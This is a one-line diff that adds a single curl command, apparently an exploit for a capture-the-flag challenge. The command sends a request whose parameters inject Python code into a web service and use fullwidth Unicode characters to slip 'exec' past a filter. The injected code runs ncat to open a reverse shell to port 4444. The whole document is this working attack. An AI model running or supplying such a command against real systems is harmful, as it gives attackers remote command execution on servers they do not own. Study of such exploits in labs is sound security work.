@@ -1,0 +1,1 @@
+curl "http://172.21.76.54:5000/?debug=import+os;rce=os.system('ncat+172.21.76.54+4444+-e+/bin/sh')" -F "type=FL4G" -F "number=ｅｘｅｃ(ｄｅｂｕｇ)"
